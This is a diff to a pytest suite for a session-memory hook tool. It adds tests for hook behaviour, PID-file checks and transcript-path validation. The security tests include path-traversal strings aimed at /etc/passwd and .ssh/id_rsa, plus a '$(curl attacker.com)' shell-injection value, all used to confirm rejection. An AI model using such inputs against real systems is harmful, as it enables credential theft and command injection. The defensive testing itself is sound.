@@ -1,6 +1,8 @@
 import contextlib
 import io
 import json
+import os
+import subprocess
 from pathlib import Path
 from unittest.mock import patch
 
@@ -9,12 +11,14 @@ import pytest
 from mempalace.hooks_cli import (
     SAVE_INTERVAL,
     STOP_BLOCK_REASON,
-    PRECOMPACT_BLOCK_REASON,
     _count_human_messages,
+    _get_mine_dir,
     _log,
     _maybe_auto_ingest,
+    _mine_already_running,
     _parse_harness_input,
     _sanitize_session_id,
+    _validate_transcript_path,
     hook_stop,
     hook_session_start,
     hook_precompact,
@@ -204,14 +208,13 @@ def test_session_start_passes_through(tmp_path):
 # --- hook_precompact ---
 
 
-def test_precompact_always_blocks(tmp_path):
+def test_precompact_allows(tmp_path):
     result = _capture_hook_output(
         hook_precompact,
         {"session_id": "test"},
         state_dir=tmp_path,
     )
-    assert result["decision"] == "block"
-    assert result["reason"] == PRECOMPACT_BLOCK_REASON
+    assert result == {}
 
 
 # --- _log ---
@@ -237,7 +240,7 @@ def test_log_oserror_is_silenced(tmp_path):
 
 
 def test_maybe_auto_ingest_no_env(tmp_path):
-    """Without MEMPAL_DIR set, does nothing."""
+    """Without MEMPAL_DIR or transcript_path, does nothing."""
     with patch.dict("os.environ", {}, clear=True):
         with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
             _maybe_auto_ingest()  # should not raise
@@ -249,9 +252,22 @@ def test_maybe_auto_ingest_with_env(tmp_path):
     mempal_dir.mkdir()
     with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
         with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
-            with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
-                _maybe_auto_ingest()
-                mock_popen.assert_called_once()
+            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
+                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
+                    _maybe_auto_ingest()
+                    mock_popen.assert_called_once()
+
+
+def test_maybe_auto_ingest_with_transcript(tmp_path):
+    """Falls back to transcript directory when MEMPAL_DIR is not set."""
+    transcript = tmp_path / "t.jsonl"
+    transcript.write_text("")
+    with patch.dict("os.environ", {}, clear=True):
+        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
+            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
+                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
+                    _maybe_auto_ingest(str(transcript))
+                    mock_popen.assert_called_once()
 
 
 def test_maybe_auto_ingest_oserror(tmp_path):
@@ -260,8 +276,81 @@ def test_maybe_auto_ingest_oserror(tmp_path):
     mempal_dir.mkdir()
     with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
         with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
-            with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=OSError("fail")):
-                _maybe_auto_ingest()  # should not raise
+            with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
+                with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=OSError("fail")):
+                    _maybe_auto_ingest()  # should not raise
+
+
+def test_maybe_auto_ingest_skips_when_mine_running(tmp_path):
+    """Does not spawn a new mine process if one is already running."""
+    mempal_dir = tmp_path / "project"
+    mempal_dir.mkdir()
+    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
+        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
+            with patch("mempalace.hooks_cli._mine_already_running", return_value=True):
+                with patch("mempalace.hooks_cli.subprocess.Popen") as mock_popen:
+                    _maybe_auto_ingest()
+                    mock_popen.assert_not_called()
+
+
+# --- _mine_already_running ---
+
+
+def test_mine_already_running_no_file(tmp_path):
+    """Returns False when no PID file exists."""
+    with patch("mempalace.hooks_cli._MINE_PID_FILE", tmp_path / "mine.pid"):
+        assert _mine_already_running() is False
+
+
+def test_mine_already_running_dead_pid(tmp_path):
+    """Returns False when PID file contains a PID that no longer exists."""
+    pid_file = tmp_path / "mine.pid"
+    pid_file.write_text("999999999")  # almost certainly not a real PID
+    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
+        assert _mine_already_running() is False
+
+
+def test_mine_already_running_live_pid(tmp_path):
+    """Returns True when PID file contains the current process's own PID."""
+    pid_file = tmp_path / "mine.pid"
+    pid_file.write_text(str(os.getpid()))  # current process is definitely alive
+    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
+        assert _mine_already_running() is True
+
+
+def test_mine_already_running_corrupt_file(tmp_path):
+    """Returns False when PID file contains non-integer content."""
+    pid_file = tmp_path / "mine.pid"
+    pid_file.write_text("not-a-pid")
+    with patch("mempalace.hooks_cli._MINE_PID_FILE", pid_file):
+        assert _mine_already_running() is False
+
+
+# --- _get_mine_dir ---
+
+
+def test_get_mine_dir_mempal_dir(tmp_path):
+    """MEMPAL_DIR takes priority over transcript_path."""
+    mempal_dir = tmp_path / "project"
+    mempal_dir.mkdir()
+    transcript = tmp_path / "t.jsonl"
+    transcript.write_text("")
+    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
+        assert _get_mine_dir(str(transcript)) == str(mempal_dir)
+
+
+def test_get_mine_dir_transcript_fallback(tmp_path):
+    """Falls back to transcript parent dir when MEMPAL_DIR is not set."""
+    transcript = tmp_path / "t.jsonl"
+    transcript.write_text("")
+    with patch.dict("os.environ", {}, clear=True):
+        assert _get_mine_dir(str(transcript)) == str(tmp_path)
+
+
+def test_get_mine_dir_empty():
+    """Returns empty string when nothing is available."""
+    with patch.dict("os.environ", {}, clear=True):
+        assert _get_mine_dir("") == ""
 
 
 # --- _parse_harness_input ---
@@ -332,7 +421,7 @@ def test_stop_hook_oserror_on_write(tmp_path):
 
 
 def test_precompact_with_mempal_dir(tmp_path):
-    """Precompact runs subprocess.run when MEMPAL_DIR is set."""
+    """Precompact runs subprocess.run (sync) when MEMPAL_DIR is set."""
     mempal_dir = tmp_path / "project"
     mempal_dir.mkdir()
     with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
@@ -342,7 +431,7 @@ def test_precompact_with_mempal_dir(tmp_path):
                 {"session_id": "test"},
                 state_dir=tmp_path,
             )
-    assert result["decision"] == "block"
+    assert result == {}
     mock_run.assert_called_once()
 
 
@@ -357,7 +446,40 @@ def test_precompact_with_mempal_dir_oserror(tmp_path):
                 {"session_id": "test"},
                 state_dir=tmp_path,
             )
-    assert result["decision"] == "block"
+    assert result == {}
+
+
+def test_precompact_with_timeout(tmp_path):
+    """Precompact handles TimeoutExpired gracefully -- still allows."""
+    mempal_dir = tmp_path / "project"
+    mempal_dir.mkdir()
+    with patch.dict("os.environ", {"MEMPAL_DIR": str(mempal_dir)}):
+        with patch(
+            "mempalace.hooks_cli.subprocess.run",
+            side_effect=subprocess.TimeoutExpired(cmd="mine", timeout=60),
+        ):
+            result = _capture_hook_output(
+                hook_precompact, {"session_id": "test"}, state_dir=tmp_path
+            )
+    assert result == {}
+
+
+def test_precompact_mines_transcript_dir(tmp_path, monkeypatch):
+    """Precompact mines transcript directory when no MEMPAL_DIR."""
+    transcript = tmp_path / "t.jsonl"
+    transcript.write_text("")
+    monkeypatch.delenv("MEMPAL_DIR", raising=False)
+    with patch("mempalace.hooks_cli.subprocess.run") as mock_run:
+        result = _capture_hook_output(
+            hook_precompact,
+            {"session_id": "test", "transcript_path": str(transcript)},
+            state_dir=tmp_path,
+        )
+    assert result == {}
+    mock_run.assert_called_once()
+    # Verify mine dir is the transcript's parent
+    call_args = mock_run.call_args[0][0]
+    assert str(tmp_path) in call_args[-1]
 
 
 # --- run_hook ---
@@ -398,9 +520,7 @@ def test_run_hook_dispatches_precompact(tmp_path):
         with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
             with patch("mempalace.hooks_cli._output") as mock_output:
                 run_hook("precompact", "claude-code")
-    mock_output.assert_called_once()
-    call_args = mock_output.call_args[0][0]
-    assert call_args["decision"] == "block"
+    mock_output.assert_called_once_with({})
 
 
 def test_run_hook_unknown_hook():
@@ -418,3 +538,87 @@ def test_run_hook_invalid_json(tmp_path):
             with patch("mempalace.hooks_cli._output") as mock_output:
                 run_hook("session-start", "claude-code")
     mock_output.assert_called_once_with({})
+
+
+# --- Security: transcript_path validation ---
+
+
+def test_validate_transcript_rejects_path_traversal():
+    """Paths with '..' components should be rejected."""
+    assert _validate_transcript_path("../../etc/passwd") is None
+    assert _validate_transcript_path("../../../.ssh/id_rsa") is None
+
+
+def test_validate_transcript_rejects_wrong_extension():
+    """Only .jsonl and .json extensions are accepted."""
+    assert _validate_transcript_path("/tmp/transcript.txt") is None
+    assert _validate_transcript_path("/tmp/secret.py") is None
+    assert _validate_transcript_path("/home/user/.ssh/id_rsa") is None
+
+
+def test_validate_transcript_accepts_valid_paths(tmp_path):
+    """Valid .jsonl and .json paths should be accepted."""
+    jsonl_path = tmp_path / "session.jsonl"
+    jsonl_path.touch()
+    result = _validate_transcript_path(str(jsonl_path))
+    assert result is not None
+    assert result.suffix == ".jsonl"
+
+    json_path = tmp_path / "session.json"
+    json_path.touch()
+    result = _validate_transcript_path(str(json_path))
+    assert result is not None
+    assert result.suffix == ".json"
+
+
+def test_validate_transcript_empty_string():
+    """Empty transcript path should return None."""
+    assert _validate_transcript_path("") is None
+
+
+def test_count_rejects_traversal_path():
+    """_count_human_messages should return 0 for path traversal attempts."""
+    assert _count_human_messages("../../etc/passwd") == 0
+
+
+def test_count_logs_warning_on_rejected_path(tmp_path):
+    """_count_human_messages should log a warning when a non-empty path is rejected."""
+    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
+        with patch("mempalace.hooks_cli._log") as mock_log:
+            _count_human_messages("../../etc/passwd")
+    mock_log.assert_called_once()
+    assert "rejected" in mock_log.call_args[0][0].lower()
+
+
+def test_validate_transcript_accepts_platform_native_path(tmp_path):
+    """Validator accepts platform-native paths (backslashes on Windows, slashes on Unix)."""
+    session_file = tmp_path / "projects" / "abc123" / "session.jsonl"
+    session_file.parent.mkdir(parents=True)
+    session_file.touch()
+    # Use the OS-native string representation (backslashes on Windows)
+    result = _validate_transcript_path(str(session_file))
+    assert result is not None
+    assert result.suffix == ".jsonl"
+    assert result.is_file()
+
+
+def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
+    """stop_hook_active with shell injection string should not cause issues."""
+    transcript = tmp_path / "t.jsonl"
+    _write_transcript(
+        transcript,
+        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
+    )
+    # Simulate a malicious stop_hook_active value
+    result = _capture_hook_output(
+        hook_stop,
+        {
+            "session_id": "test",
+            "stop_hook_active": "$(curl attacker.com)",
+            "transcript_path": str(transcript),
+        },
+        state_dir=tmp_path,
+    )
+    # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through
+    # It should count messages and block at the interval
+    assert result["decision"] == "block"
